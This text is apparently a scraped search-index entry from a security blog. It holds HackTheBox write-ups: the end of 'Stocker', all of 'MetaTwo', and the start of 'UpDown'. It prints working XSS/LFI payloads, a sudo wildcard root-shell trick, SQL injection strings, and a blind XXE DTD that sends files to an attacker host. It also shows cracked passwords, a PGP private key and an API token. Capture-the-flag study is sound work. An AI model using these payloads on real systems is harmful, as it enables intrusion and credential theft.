exiftool asdf.pdf ExifTool Version Number : 12.44 File Name : asdf.pdf Directory : . File Size : 41 kB File Modification Date/Time : 2023:06:10 23:10:55+08:00 File Access Date/Time : 2023:06:10 23:10:54+08:00 File Inode Change Date/Time : 2023:06:10 23:11:06+08:00 File Permissions : -rw-r--r-- File Type : PDF File Type Extension : pdf MIME Type : application/pdf PDF Version : 1.4 Linearized : No Page Count : 1 Tagged PDF : Yes Creator : Chromium Producer : Skia/PDF m108 Create Date : 2023:06:10 15:05:00+00:00 Modify Date : 2023:06:10 15:05:00+00:00 Skia/PDF m108 - Google it title parameter is susceptible to XSS, allowing us to do LFI # Payload &quot;title&quot;:&quot;&amp;lt;iframe src=/etc/passwd&amp;gt;&quot;, View index.js (Because web running on node.js) # Payload &quot;title&quot;:&quot;&amp;lt;iframe width=1000 height=1000 src=/var/www/dev/index.js&amp;gt;&amp;lt;/iframe&amp;gt;&quot; dev:IHeardPassphrasesArePrettySecure TCP/22 (SSH) Since dev user does not exist, ssh into user angoose ┌──(root💀kali)-[~/htb/stocker/10.10.11.196/exploit] └─# sshpass -p &#39;IHeardPassphrasesArePrettySecure&#39; ssh angoose@stocker.htb Last login: Sat Jun 10 00:32:45 2023 from 10.10.14.2 angoose@stocker:~$ id;whoami uid=1001(angoose) gid=1001(angoose) groups=1001(angoose) angoose angoose@stock Privilege EscalationRoot - Wildcard + Node Sudo User angoose sudo access angoose@stocker:/var/www/dev$ sudo -l Matching Defaults entries for angoose on stocker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User angoose may run the following commands on stocker: (ALL) /usr/bin/node /usr/local/scripts/*.js The usage of * makes this sudo privilege vulnerable, we are able to do directory traversal and point /usr/bin/node to any file we want /usr/local/scripts/../../../../../../tmp/something.js works Create payload /tmp/exploit.js angoose@stocker:/var/www/dev$ nano /tmp/exploit.js require(&quot;child_process&quot;).spawn(&quot;/bin/sh&quot;, {stdio: [0, 1, 2]}) angoose@stocker:/var/www/dev$ chmod +x /tmp/exploit.js Execute our exploit w/ /usr/bin/node to root # Payload sudo /usr/bin/node /usr/local/scripts/../../../../../../../tmp/exploit.js Demo - Node sudo + wildcard " }, { "title": "HackTheBox - MetaTwo", "url": "/posts/MetaTwo/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "tcp/80-http/cms/wordpress, exploit/sqli/database-enum", "date": "2023-05-01 00:00:00 +0800", "snippet": "OverviewThe machine begins with a web enumeration which led to the discovery of a vulnerable version of WordPress 5.6.2 and a vulnerable plugin, Booking Press 1.0.10. The plugin Booking Press 1.0.10 was found to be susceptible to SQL injection, which allowed the extraction of WordPress user credentials. The WordPress 5.6.2 version, on the other hand, was vulnerable to an authenticated XML External Entity (XXE) attack that enabled access to the wp-config.php file, exposing FTP service credentials. With the FTP service credentials, access was gained to user jnelson, which resulted in obtaining a low-privilege shell.During system enumeration, the .passpie directory containing a password management system from the command line was found. This system allowed the use of a master password to decrypt stored login credentials. A private key in the .key file was discovered and subsequently cracked, resulting in the disclosure of the master password and revealing the root credentials. Column Details Box Name MetaTwo IP 10.10.11.186 Points 20 Difficulty Easy Creator Nauten Release Date 29 Oct 2022 ReconTCP/80 (HTTP) FFUF thank-you [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1881ms] wp-admin [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 551ms] wp-includes [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 271ms] wp-content [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 334ms] xmlrpc.php [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 1624ms] NMAP nginx 1.18.0 Initial FootholdTCP/80 (HTTP) - WP Enumeration Upon visiting metatwo.htb, redirected to metapress.htb. Add metapress.htb to /etc/hosts Interesting information found w/ burp Some Version Info nginx/1.18.0 PHP/8.0.24 Enumerate wordpress Enumerate wordpress core wpscan --api-token &#39;GxW0TPs6iLPbI3NyYXvImtduST54Zzb82yrM2KGWb5M&#39; --no-update --disable-tls-checks --url http://metapress.htb [+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22). | Found By: Rss Generator (Passive Detection) | - http://metapress.htb/feed/, &amp;lt;generator&amp;gt;https://wordpress.org/?v=5.6.2&amp;lt;/generator&amp;gt; | - http://metapress.htb/comments/feed/, &amp;lt;generator&amp;gt;https://wordpress.org/?v=5.6.2&amp;lt;/generator&amp;gt; | | [!] 28 vulnerabilities identified: | | [!] Title: WordPress 5.6-5.7 - Authenticated XXE Within the Media Library Affecting PHP 8 | Fixed in: 5.6.3 | References: | - https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29447 | - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/ | - https://core.trac.wordpress.org/changeset/29378 | - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html | - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-rv47-pc52-qrhh | - https://blog.sonarsource.com/wordpress-xxe-security-vulnerability/ | - https://hackerone.com/reports/1095645 | - https://www.youtube.com/watch?v=3NBxcmqCgt4 Wordpress Core 5.6.2 Susceptible to Authenticated XXE, when running on PHP 8.0 (requirement met !) We’ll have to find valid credentials first, let’s move on. Enumerate users ┌──(root💀kali)-[~/htb/metatwo] └─# wpscan --api-token &#39;GxW0TPs6iLPbI3NyYXvImtduST54Zzb82yrM2KGWb5M&#39; --no-update --disable-tls-checks --url http://metapress.htb -e u -f cli-no-color 2&amp;gt;&amp;amp;1 | tee &quot;tcp_80_http_wpscan_user_enum.txt&quot; [i] User(s) Identified: [+] admin | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://metapress.htb/wp-json/wp/v2/users/?per_page=100&amp;amp;page=1 | Rss Generator (Aggressive Detection) | Author Sitemap (Aggressive Detection) | - http://metapress.htb/wp-sitemap-users-1.xml | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] manager | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) Found Users admin manager Enumerate plugins (aggressively) ┌──(root💀kali)-[~/htb/metatwo/10.10.11.186] └─# wpscan --api-token &#39;GxW0TPs6iLPbI3NyYXvImtduST54Zzb82yrM2KGWb5M&#39; --no-update --disable-tls-checks --plugins-detection aggressive --plugins-version-detectio n aggressive --url http://metapress.htb -e ap -f cli-no-color 2&amp;gt;&amp;amp;1 | tee &quot;tcp_80_http_wpscan_plugin_enum.txt&quot; [i] Plugin(s) Identified: [+] bookingpress-appointment-booking | Location: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/ | Latest Version: 1.0.2 (up to date) | Last Updated: 2021-12-10T15:51:00.000Z | Readme: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt | | Found By: Known Locations (Aggressive Detection) | - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/, status: 200 | | Version: 1.0.10 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt Potentially vulnerable plugin bookingpress-appointment-booking - 1.0.10 TCP/80 (HTTP) - WP Booking Press 1.0.10 Plugin SQLi Search exploits for bookingpress-appointment-booking - 1.0.10 Chris01s/CVE-2022-0739 How do we exploit bookingpress-appointment-booking - 1.0.10 Due to improper user input sanitization in the POST data, before it is used in a dynamically constructed SQL query via the bookingpress_front_get_category_services (available to unauthenticated user), leading to an unauthenticated SQL injection. Try Chris01s/CVE-2022-0739 We have to find out the URL where the booking press application is in use. http://metapress.htb/events/ Run exploit ┌──(root💀kali)-[~/htb/metatwo/10.10.11.186/exploit] └─# bash exploit.sh http://metapress.htb/events/ | tail -n 3 | cut -d &quot; &quot; -f2 | tee hash $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. $P$B4aNM28N0E.tMy\\/JIcnVMZbGcU16Q70 Identify hashing alogrithm w/ nth ┌──(root💀kali)-[~/htb/metatwo/10.10.11.186/exploit] └─# nth --file hash $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. Most Likely Wordpress ≥ v2.6.2, HC: 400 JtR: phpass Joomla ≥ v2.5.18, HC: 400 JtR: phpass PHPass&#39; Portable Hash, HC: 400 JtR: phpass $P$B4aNM28N0E.tMy\\/JIcnVMZbGcU16Q70 No hashes found. Why is 2nd hash invalid ? 2nd hash is invalid because \\ is used to escape /, we have to remove the escape character, so that it is a valid hash. Identify hashing alogrithm again ┌──(root💀kali)-[~/htb/metatwo/10.10.11.186/exploit] └─# nth --file hash $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. Most Likely Wordpress ≥ v2.6.2, HC: 400 JtR: phpass Joomla ≥ v2.5.18, HC: 400 JtR: phpass PHPass&#39; Portable Hash, HC: 400 JtR: phpass $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 Most Likely Wordpress ≥ v2.6.2, HC: 400 JtR: phpass Joomla ≥ v2.5.18, HC: 400 JtR: phpass PHPass&#39; Portable Hash, HC: 400 JtR: phpass Hashing Algorithm phpass Crack hash w/ hashcat ┌──(root💀kali)-[~/htb/metatwo/10.10.11.186/exploit] └─# hashcat -a 0 -m 400 hash /usr/share/wordlists/rockyou.txt --show $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar Valid Credential manager:partylikearockstar Login w/ manager:partylikearockstarTCP/80 (HTTP) - WP Core 5.6.2 Authenticated XXE Since we have a set of valid credential, let’s try to exploit the Authenticated XXE Vulnerability found earlier. Search exploits for Wordpress 5.6.2 Authenticated XXE POC of WP Core 5.6.2 Authenticated XXE (CVE-2021-29447) How does Wordpress 5.6.2 Authenticated XXE work? WordPress uses ID3 library to parse information about an audio file uploaded in the Media Library that was vulnerable to XXE due to a XML parsing issue, allowing authenticated user to do to remote arbitrary file disclosure. Try POC of WP Core 5.6.2 Authenticated XXE (CVE-2021-29447) Create malicious WAVE file ┌──(root💀kali)-[~/htb/metatwo/10.10.11.186/exploit] └─# echo -en &#39;RIFF\\xb8\\x00\\x00\\x00WAVEiXML\\x7b\\x00\\x00\\x00&amp;lt;?xml version=&quot;1.0&quot;?&amp;gt;&amp;lt;!DOCTYPE ANY[&amp;lt;!ENTITY % remote SYSTEM &#39;&quot;&#39;&quot;&#39;http://10.10.14.13:4444/evil.dtd&#39;&quot;&#39;&quot;&#39;&amp;gt;%remote;%init;%trick;]&amp;gt;\\x00&#39; &amp;gt; payload.wav ┌──(root💀kali)-[~/htb/metatwo/10.10.11.186/exploit] └─# cat payload.wav RIFFWAVEiXML{&amp;lt;?xml version=&quot;1.0&quot;?&amp;gt;&amp;lt;!DOCTYPE ANY[&amp;lt;!ENTITY % remote SYSTEM &#39;http://10.10.14.13:4444/evil.dtd&#39;&amp;gt;%remote;%init;%trick;]&amp;gt;┌──(root💀kali)-[~/htb/metatwo/10.10.11.186/exploit] Why do we need WAVE file. This file contains the reference to the malicious dtd file, we must do so because this is a blind XXE vulnerability, meaning the parsed XML data will not be reflected/sent back to user, we are gonna need a blind XXE payload. We can do so by using an external dtd file. Create dtd file ┌──(root💀kali)-[~/htb/metatwo/10.10.11.186/exploit] └─# cat evil.dtd &amp;lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&amp;gt; &amp;lt;!ENTITY % init &quot;&amp;lt;!ENTITY &amp;amp;#x25; trick SYSTEM &#39;http://10.10.14.13:4444/?p=%file;&#39;&amp;gt;&quot; &amp;gt; Why do we need evil.dtd? The dtd file contains payload to exfiltrate file. By referencing an external malicious DTD file (evil.dtd), we are able to exfiltrate our desired file. Host evil.dtd ┌──(root💀kali)-[~/htb/metatwo/10.10.11.186/exploit] └─# php -S 0.0.0.0:4444 [Mon Nov 28 16:42:18 2022] PHP 8.1.5 Development Server (http://0.0.0.0:4444) started Exfiltrate file /etc/passwd Why /etc/passwd ? This is to find out whether the XXE exploit works, since /etc/passwd is found in every Linux system. Also, to find out user accounts on the Linux system. To proceed, we have to include something useful, the next thing that comes to my mind is to include wp-config.php, as it contains credentials. However, we do not know the full path of the web root directory. Let’s find out! Earlier, we found out that the web server is running nginx 1.18.0 Virtual Host is used (due to redirecting from metatwo.htb -&amp;gt; metapress.htb) We are able to find out the root web directory by including the virtual host configuration file nginx virtual host configuration file (/etc/nginx/sites-available/default) contains the web root directory for every virtual host configured. This initial foothold method is very similar to HackTheBox - Trick Create evil.dtd to exfiltrate /etc/nginx/sites-available/default &amp;lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/nginx/sites-available/default&quot;&amp;gt; &amp;lt;!ENTITY % init &quot;&amp;lt;!ENTITY &amp;amp;#x25; trick SYSTEM &#39;http://10.10.14.13:4444/?p=%file;&#39;&amp;gt;&quot; &amp;gt; Exfiltrate /etc/nginx/sites-available/default Web Root Directory /var/www/metapress.htb/blog Create evil.dtd to exfiltrate /var/www/metapress.htb/blog/wp-config.php &amp;lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/var/www/metapress.htb/blog/wp-config.php&quot;&amp;gt; &amp;lt;!ENTITY % init &quot;&amp;lt;!ENTITY &amp;amp;#x25; trick SYSTEM &#39;http://10.10.14.13:4444/?p=%file;&#39;&amp;gt;&quot; &amp;gt; Exfiltrate wp-config.php Valid Credential s blog:635Aq@TdqrCwXFUZ metapress.htb:9NYS_ii@FyL_p5M2NvJ TCP/21 (FTP) - Bruteforce Bruteforce FTP w/ hydra ┌──(root💀kali)-[~/htb/metatwo/10.10.11.186/exploit] └─# hydra -L usernames.txt -P passwords.txt ftp://metapress.htb -I Hydra v9.3 (c) 2022 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-29 09:30:51 [DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries (l:4/p:3), ~1 try per task [DATA] attacking ftp://metapress.htb:21/ [21][ftp] host: metapress.htb login: metapress.htb password: 9NYS_ii@FyL_p5M2NvJ 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-29 09:31:03 Valid Credential metapress.htb:9NYS_ii@FyL_p5M2NvJ TCP/21 (FTP) - Creds Found Next, we use FileZilla so that we can navigate FTP with ease Download mailer directory Found a set of valid credential in send_mail.php Valid Credential jnelson:Cb4_JmWM8zUZWMu@Ys TCP/22 (SSH) Successfully SSH w/ jnelson:Cb4_JmWM8zUZWMu@Ys ┌──(root💀kali)-[~/htb/metatwo/10.10.11.186/ftp/metapress.htb] └─# sshpass -p &#39;Cb4_JmWM8zUZWMu@Ys&#39; ssh jnelson@metapress.htb Linux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Mon Nov 28 23:11:36 2022 from 10.10.14.103 jnelson@meta2:~$ ls gpg.john gzipped.tar.gz pass user.txt wp-config.php -z jnelson@meta2:~$ cat user.txt a78b080b1bf04536906f33fa36723af2 jnelson@meta2:~$ Privilege EscalationRoot - Enumeration Found an interesting directory .passpie &amp;amp; .keys jnelson@meta2:~$ find . . ./user.txt ./.bash_logout ./.bash_history ./.local ./.local/share ./.local/share/nano ./.bashrc ./.passpie ./.passpie/.keys ./.passpie/ssh ./.passpie/ssh/root.pass ./.passpie/ssh/jnelson.pass ./.passpie/.config ./.profile jnelson@meta2:~$ passpie list ╒════════╤═════════╤════════════╤═══════════╕ │ Name │ Login │ Password │ Comment │ ╞════════╪═════════╪════════════╪═══════════╡ │ ssh │ jnelson │ ******** │ │ ├────────┼─────────┼────────────┼───────────┤ │ ssh │ root │ ******** │ │ ╘════════╧═════════╧════════════╧═══════════╛ jnelson@meta2:~$ .passpie - Passpie is a command line tool to manage passwords from the terminal. Use a master passphrase to decrypt login credentials, copy passwords to clipboard, syncronize with a git repository, check the state of your password .keys contains the private &amp;amp; public key of the master password (this is a guess) Copy the private key from .keys &amp;amp; transfer it to kali -----BEGIN PGP PRIVATE KEY BLOCK----- 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 =7Uo6 -----END PGP PRIVATE KEY BLOCK----- Root - Crack GPG Private Key Convert private key to john format ┌──(root💀kali)-[~/htb/metatwo/10.10.11.186/gpg] └─# gpg2john priv | tee john_priv File priv Passpie:$gpg$*17*54*3072*e975911867862609115f302a3d0196aec0c2ebf79a84c0303056df921c965e589f82d7dd71099ed9749408d5ad17a4421006d89b49c0*3*254*2*7*16*21d36a3443b38bad35df0f0e2c77f6b9*65011712*907cb55ccb37aaad:::Passpie (Auto-generated by Passpie) &amp;lt;passpie@local&amp;gt;::priv Crack it w/ john against rockyou wordlist ┌──(root💀kali)-[~/htb/metatwo/10.10.11.186/gpg] └─# john --wordlist=/usr/share/wordlists/rockyou.txt john_priv Using default input encoding: UTF-8 Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64]) Cost 1 (s2k-count) is 65011712 for all loaded hashes Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all lo aded hashes Will run 2 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status 0g 0:00:00:02 0.00% (ETA: 2022-12-06 02:30) 0g/s 29.41p/s 29.41c/s 29.41C/s hello..elizabeth blink182 (Passpie) 1g 0:00:00:05 DONE (2022-11-29 10:53) 0.1782g/s 29.59p/s 29.59c/s 29.59C/s blink182..sweetie Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed. Valid Credential passpie:blink182 Export credentials from passpie w/ blink182 as the password jnelson@meta2:~$ passpie export password Passphrase: blink182 jnelson@meta2:~$ cat password credentials: - comment: &#39;&#39; fullname: root@ssh login: root modified: 2022-06-26 08:58:15.621572 name: ssh password: !!python/unicode &#39;p7qfAZt4_A1xo_0x&#39; - comment: &#39;&#39; fullname: jnelson@ssh login: jnelson modified: 2022-06-26 08:58:15.514422 name: ssh password: !!python/unicode &#39;Cb4_JmWM8zUZWMu@Ys&#39; handler: passpie version: 1.0 jnelson@meta2:~$ Valid Credential root:p7qfAZt4_A1xo_0x Switch to root jnelson@meta2:~$ su root Password: root@meta2:/home/jnelson# id;whoami; cat /root/root.txt uid=0(root) gid=0(root) groups=0(root) root ce890296849507842a811feaed595c2a root@meta2:/home/jnelson# AdditionalSQLMap Instead of using Chris01s/CVE-2022-0739, we can use SQLMap to exfiltrate more information We have to follow these steps in order to obtain the POST request to do SQLi First, we have to find out the nonce, we can do by viewing the page source of http://metapress.htb/events/ wpnonce: 221f0d0bf9 Next, we have to invoke a curl command w/ SQLi Payload ┌──(root💀kali)-[~/htb/metatwo/10.10.11.186/exploit] └─# curl -i &#39;http://metapress.htb/wp-admin/admin-ajax.php&#39; --data &#39;action=bookingpress_front_get_category_services&amp;amp;_wpnonce=221f0d0bf9&amp;amp;category_id=33&amp;amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -&#39; -x http://127.0.0.1:8080 Intercept request w/ burp &amp;amp; remove SQLi Payload and save request SQLMap Enumerate databases ┌──(root💀kali)-[~/htb/metatwo/10.10.11.186/exploit] └─# sqlmap -r booking.req -p total_service --batch --dbs --- Parameter: total_service (POST) Type: time-based blind Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: action=bookingpress_front_get_category_services&amp;amp;_wpnonce=221f0d0bf9&amp;amp;category_id=33&amp;amp;total_service=1) AND (SELECT 7909 FROM (SELECT(SLEEP(5)))TrGN) AND (3800=3800 Type: UNION query Title: Generic UNION query (NULL) - 9 columns Payload: action=bookingpress_front_get_category_services&amp;amp;_wpnonce=221f0d0bf9&amp;amp;category_id=33&amp;amp;total_service=1) UNION ALL SELECT NULL,CONCAT(0x7162707671,0x454c54705963694f4179576f4973705a6f62646e4e706e5a664a4d5466584c4b4d6762674f537964,0x716b717871),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- - --- [11:55:39] [INFO] the back-end DBMS is MySQL web application technology: Nginx 1.18.0, PHP 8.0.24 back-end DBMS: MySQL &amp;gt;= 5.0.12 (MariaDB fork) [11:55:39] [INFO] fetching database names available databases [2]: [*] blog [*] information_schema Databases blog information_schema Enumerate tables in blog database ┌──(root💀kali)-[~/htb/metatwo/10.10.11.186/exploit] └─# sqlmap -r booking.req -p total_service --batch -D blog --tables --- Parameter: total_service (POST) Type: time-based blind Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: action=bookingpress_front_get_category_services&amp;amp;_wpnonce=221f0d0bf9&amp;amp;category_id=33&amp;amp;total_service=1) AND (SELECT 7909 FROM (SELECT(SLEEP(5)))TrGN) AND (3800=3800 Type: UNION query Title: Generic UNION query (NULL) - 9 columns Payload: action=bookingpress_front_get_category_services&amp;amp;_wpnonce=221f0d0bf9&amp;amp;category_id=33&amp;amp;total_service=1) UNION ALL SELECT NULL,CONCAT(0x7162707671,0x454c54705963694f4179576f4973705a6f62646e4e706e5a664a4d5466584c4b4d6762674f537964,0x716b717871),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- - --- [12:01:23] [INFO] the back-end DBMS is MySQL web application technology: Nginx 1.18.0, PHP 8.0.24 back-end DBMS: MySQL &amp;gt;= 5.0.12 (MariaDB fork) [12:01:23] [INFO] fetching tables for database: &#39;blog&#39; Database: blog [27 tables] +--------------------------------------+ | wp_bookingpress_appointment_bookings | | wp_bookingpress_categories | | wp_bookingpress_customers | | wp_bookingpress_customers_meta | | wp_bookingpress_customize_settings | | wp_bookingpress_debug_payment_log | | wp_bookingpress_default_daysoff | | wp_bookingpress_default_workhours | | wp_bookingpress_entries | | wp_bookingpress_form_fields | | wp_bookingpress_notifications | | wp_bookingpress_payment_logs | | wp_bookingpress_services | | wp_bookingpress_servicesmeta | | wp_bookingpress_settings | | wp_commentmeta | | wp_comments | | wp_links | | wp_options | | wp_postmeta | | wp_posts | | wp_term_relationships | | wp_term_taxonomy | | wp_termmeta | | wp_terms | | wp_usermeta | | wp_users | +--------------------------------------+ Tables wp_users Dump columns --- Parameter: total_service (POST) Type: time-based blind Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: action=bookingpress_front_get_category_services&amp;amp;_wpnonce=221f0d0bf9&amp;amp;category_id=33&amp;amp;total_service=1) AND (SELECT 7909 FROM (SELECT(SLEEP(5)))TrGN) AND (3800=3800 Type: UNION query Title: Generic UNION query (NULL) - 9 columns Payload: action=bookingpress_front_get_category_services&amp;amp;_wpnonce=221f0d0bf9&amp;amp;category_id=33&amp;amp;total_service=1) UNION ALL SELECT NULL,CONCAT(0x7162707671,0x454c54705963694f4179576f4973705a6f62646e4e706e5a664a4d5466584c4b4d6762674f537964,0x716b717871),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- - --- [12:07:12] [INFO] the back-end DBMS is MySQL web application technology: Nginx 1.18.0, PHP 8.0.24 back-end DBMS: MySQL &amp;gt;= 5.0.12 (MariaDB fork) [12:07:12] [INFO] fetching entries of column(s) &#39;user_login,user_pass&#39; for table &#39;wp_users&#39; in database &#39;blog&#39; [12:07:13] [INFO] recognized possible password hashes in column &#39;user_pass&#39; do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N do you want to crack them via a dictionary-based attack? [Y/n/q] n Database: blog Table: wp_users [2 entries] +------------+------------------------------------+ | user_login | user_pass | +------------+------------------------------------+ | admin | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | | manager | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | +------------+------------------------------------+ Hashes admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 Crack Hash" }, { "title": "HackTheBox - UpDown", "url": "/posts/UpDown/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "exploit/file-inclusion/lfi, exploit/file-upload-bypass", "date": 